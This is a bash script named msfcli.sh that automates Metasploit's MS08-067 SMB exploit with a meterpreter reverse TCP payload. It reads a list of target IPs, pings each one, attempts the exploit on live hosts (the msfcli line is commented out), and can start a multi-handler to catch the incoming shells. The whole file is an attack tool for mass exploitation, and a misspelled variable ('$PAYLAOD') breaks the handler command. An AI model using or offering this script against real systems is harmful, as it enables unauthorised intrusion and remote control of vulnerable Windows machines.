#!/bin/bash

EXPLOIT="windows/smb/ms08_067_netapi"
PAYLOAD="windows/meterpreter/reverse_tcp"
TARGETFILE="No RHOST set."
LHOST="No LHOST set."
LPORT="443"
MULTI="False"
PING="/bin/ping -q -c1"

if [ "$1" == "" ]
then
	echo "Usage ./msfcli.sh [options]"
	echo "Use -h or --help for more information"
	exit 0
fi

while [ "$1" != "" ]; do
	case $1 in
		-h|--help)
                	echo "Usage ./msfcli.sh [options]"
                	echo ""
                	echo "-h, --help			you are looking at it"
                	echo "-e, --exploit [EXPLOIT]		set the exploit to use"
                	echo "-p, --payload [PAYLOAD]		set the payload to use"
                	echo "-l, --lhost [LHOST]		set the local host"
                	echo "-t, --targetfile [TARGETFILE]		set to target file"
                	echo "-m, --multi [value]		starts a multi-handler in a new window"
                	echo "				default set to 'False'"
                	echo ""
                	echo "Examples:"
                	echo "	./msfcli.sh -t hosts.txt -l 192.168.1.100 -m True"
                	                	
                	
                        exit 0
                        ;;
                -e|--exploit)		
                	shift
                	EXPLOIT=$1
                	;;
                -p|--payload)		
                	shift
                        PAYLOAD=$1
                        ;;
                -l|--lhost)
                	shift
                        LHOST=$1
                        ;;
                -t|--targetfile)
                	shift
                	TARGETFILE=$1
                	;;
                -m|--multi)
                	shift
                	MULTI=$1
                	;;
                * )
                        break
                        ;;
                esac
                shift
        done
        
        
        
        if [ "$MULTI" = "True" ]
        then
        	gnome-terminal -x msfcli exploit/multi/handler payload=$PAYLAOD lhost=$LHOST  lport=$LPORT E &
        	sleep 15
        fi
        
        
        
        
        for ip in $(cat $TARGETFILE)
        do
        	$PING $ip &>/dev/null
        	if [ $? -ne 0 ]; then
        		echo "Host $ip is down"
        	else
        		echo "Using MS08_067 on $ip"
        		#msfcli $EXPLOIT PAYLOAD=$PAYLOAD rhost=$ip lhost=$LHOST lport=$LPORT DisablePayloadHandler=true E
        	fi
        	
        done
